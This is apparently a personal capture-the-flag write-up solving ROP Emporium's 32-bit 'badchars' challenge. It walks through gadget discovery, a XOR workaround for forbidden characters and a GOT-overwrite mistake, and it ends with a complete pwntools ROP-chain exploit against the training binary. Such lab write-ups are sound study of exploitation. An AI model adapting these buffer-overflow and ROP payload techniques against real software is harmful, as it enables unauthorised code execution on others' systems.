---
title: "ROPEmporium: badchars 32-bit"
date: 2021-05-24T19:58:00+02:00
---

# Writeup of bad characters [badchars] on ROPEmporium

Prerequisites: Knowledge from previous challs, XOR (Exclusive Or) 

------------------------------------

This was a more difficult exploit to create, due to the fact that we had bad characters

As usual I started checking the security settings on the binary provided
```c
cave@noobpwn:~/binexp/ROP-emperium/badchars_32$ checksec badchars32

[*] '/home/cave/binexp/ROP-emperium/badchars_32/badchars32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
```
We see that there is NX enabled.

Next we run the program. I get the output "badchars are: 'x', 'g', 'a', '.'

These are the characters we want to avoid. We want to read the file "flag.txt", which has all of the bad characters present. Fuck.


```c
pwndbg> info functions
Non-debugging symbols:
0x080483b0  pwnme@plt
0x080483d0  print_file@plt
0x080483f0  _start
0x08048506  main
0x0804852a  usefulFunction
0x08048543  usefulGadgets
```

The usefulGadgets are at 0x08048543. Let's disassemble that!
```c
pwndbg> disass 0x08048543
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>: add    BYTE PTR [ebp+0x0],bl
   0x08048546 <+3>: ret    
   0x08048547 <+4>: xor    BYTE PTR [ebp+0x0],bl
   0x0804854a <+7>: ret    
   0x0804854b <+8>: sub    BYTE PTR [ebp+0x0],bl
   0x0804854e <+11>:    ret    
   0x0804854f <+12>:    mov    DWORD PTR [edi],esi
   0x08048551 <+14>:    ret    
End of assembler dump.
pwndbg> 
```
*Data been removed for readability


In the description of the challenge on the site, it said something along the lines of "Maybe you could change the string, once it is in memory?"

I wanted to use the xor gadget for this, because I couldn't quite wrap my head around how I should use the add or sub gadgets. 
We're also given the "mov DWORD ptr [edi],  esi". What this gadget does is move the value of esi into the address of edi. 

We need a few more gadgets before we can start planning our ROPchain. We need a gadget to control esi, and edi.

I tried to use ropper, but gave up and just used what I was comfortable with:
```c
cave@noobpwn:~/binexp/ROP-emperium/badchars_32$ ROPgadget --binary badchars32 | grep "pop esi"

0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
```
Another useful gadget, but we don't need the "pop ebp", so we'll just fill that with garbage

Gadgets I want to use:
```c
xor byte ptr [ebp],bl
mov dword ptr [edi], esi
pop esi, pop edi, pop ebp
pop ebp (to set addr for xor)
pop ebx (to set bl for xor)
```

I also needed to check what address spaces were writable, otherwise I couldn't write my string anywhere. I did this with radare2 and the iS function. You can also use readelf -S <binary>
```c
addr          vsize       name  
0x08049efc    0x4 -rw- .init_array
0x08049f00    0x4 -rw- .fini_array
0x08049f04   0xf8 -rw- .dynamic
0x08049ffc    0x4 -rw- .got
0x0804a000   0x18 -rw- .got.plt
0x0804a018    0x8 -rw- .data
0x0804a020    0x4 -rw- .bss
```

Now I was ready to plan my ROPchain.

I planned my masterplan:
```
Step 1. Move a string into a writable data segment

Step 2. XOR the string bytewise, so that its equal to flag

Step 3. Do step 1, but with .txt

Step 4. Call useFunc, printfile@plt 

Step 5. ?????

Step 6. Profit
```


This proved to be more difficult that I had wanted. I first wrote a small python script:
```python
badChars=["x","g","a","."]


def xory(string):
    for x in range(0,3):
        chars=[]
        for i in string:
            a = chr(ord(i)^x)
            if a not in badChars:
                chars.append(a)
                if len(chars)==4:
                    print(f"key is {x}: {chars}")#.join(chars))

xory("flag")
print("\n")
xory(".txt")
```

I ran it:
```
key is 2: ['d', 'n', 'c', 'e']

key is 1: ['/', 'u', 'y', 'u']
key is 2: [',', 'v', 'z', 'v']
```

So we get a string "dnce" when xored with 2, will equal flag
And another string ",vzv" when xored with 2, will equal .txt

Nice!

So we need to find our address in data, and xor that. Then we xor that address+0, address+1, address+2, address+3. And then the entire address is xored.

We repeat that process and use it once again but with ",vzv" instead. 

Aaaaaaaaaand we get an error: 
```c
Program received signal SIGSEGV, Segmentation fault.
 ► 0xf7f4f7e6    mov    ecx, dword ptr [eax + 0x34]
```

Wait... What? Now I was confused. I tried without the second part of the code, and I received this error:
```
b"Thank you!\nFailed to open file: flag\x90\x99\xf4\xf7\x10;\xf3\xf7\xbd&\xf1\xf7\xf0\xed\xd2\xf7\xcf'\xf1\xf7\n\nChild exited with status 1\n"
```

What the fuck? Atleast it's a somewhat positive error. I know that it did indeed change dnce to flag in data. But it kept reading many more bytes
afterwards.... Weird... I tried tried using the second part of the code but adding a nullbyte, but I just got the same:
```c
 ► 0xf7f4f7e6    mov    ecx, dword ptr [eax + 0x34]
```

A crucial lesson was then learned. The GOT is also known as the Global Offset Table, and is used for holding addresses of functions, that need to be called. I was quite literally writing to the space in memory, that holds function addresses, does that seem smart, when I'm trying to call a print_file function? No? No, not really.

So let's try it with a different memory segment:, I used a segment with 4 bytes of size

```
b"Thank you!\nFailed to open file: flag\n\nChild exited with status 1\n"
```
Ofcourse this would yield an error since the flag is in "flag.txt", and we only control 4 bytes

I tried again but with .data, which is 8 bytes and boom!
```
b'Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
```

Exploit:

```python
#Is it too late now to say XORy?

from pwn import *

elfPath="./badchars32"
context.arch="i386"

#BL is the lower 8 bits/1 byte of ebx: pop ebx=0xdeadbeef, then bl="ef" (or something like this)


useFunc=p32(0x08048538) #print
datasegm= 0x0804a018 

xor_ebp_bl = p32(0x08048547) #xor [ebp],bl
mov_edi_esi = p32(0x0804854f) #mov [edi], esi

pop_esi_edi_ebp=p32(0x080485b9)      #pop esi; pop edi; pop ebp; ret
pop_ebx=p32(0x0804839d)      #pop ebx; ret
pop_ebp=p32(0x080485bb)      #pop ebp; ret

badCharstxt=["x","g","a","."]

gdbscript= """
c
"""

terminalSetting = ['gnome-terminal', '-e']
context.clear(terminal=terminalSetting)

io = pwnlib.gdb.debug(elfPath, gdbscript = gdbscript)

#mnm = cyclic_gen()
#mnm = mnm.get(80)
point=cyclic_find(b"laaa", endian="little")
#6161616c is at the return or laaa


def main():
    print(io.recvuntil("> "))

    payload=b"A"*point #padding
    
    payload+=pop_esi_edi_ebp+b"dnce"+p32(datasegm)+p32(datasegm) #Sets esi="dnce", edi=address of .data, ebp=address of .data
    payload+=mov_edi_esi #moves esi into the address of edi ("dnce" -> .data)

######################################################
    payload+=pop_ebx+p32(2) #sets ebx=2
    
    payload+=xor_ebp_bl #xor datasegm with 2
    
    payload+=pop_ebp+p32(datasegm+1)
    payload+=xor_ebp_bl #xor datasegm+1 with 2

    payload+=pop_ebp+p32(datasegm+2)
    payload+=xor_ebp_bl #so on

    payload+=pop_ebp+p32(datasegm+3)
    payload+=xor_ebp_bl

######################################################
    
    payload+=pop_esi_edi_ebp+b",vzv"+p32(datasegm+0x4)+p32(datasegm+0x4) #Sets esi=",vzv", edi=address of .data, ebp=address of .data
    payload+=mov_edi_esi #moves esi into the address of edi (",vzv" -> .data+0x4)

######################################################
    payload+=pop_ebx+p32(2) #sets ebx=2

    payload+=xor_ebp_bl #xor datasegm with 2

    payload+=pop_ebp+p32(datasegm+5)
    payload+=xor_ebp_bl #xor datasegm+1 with 2

    payload+=pop_ebp+p32(datasegm+6)
    payload+=xor_ebp_bl #so on

    payload+=pop_ebp+p32(datasegm+7)
    payload+=xor_ebp_bl

######################################################
    payload+=useFunc+p32(datasegm)

    io.send(payload)
    print(io.recv(2048))
    io.interactive()
```
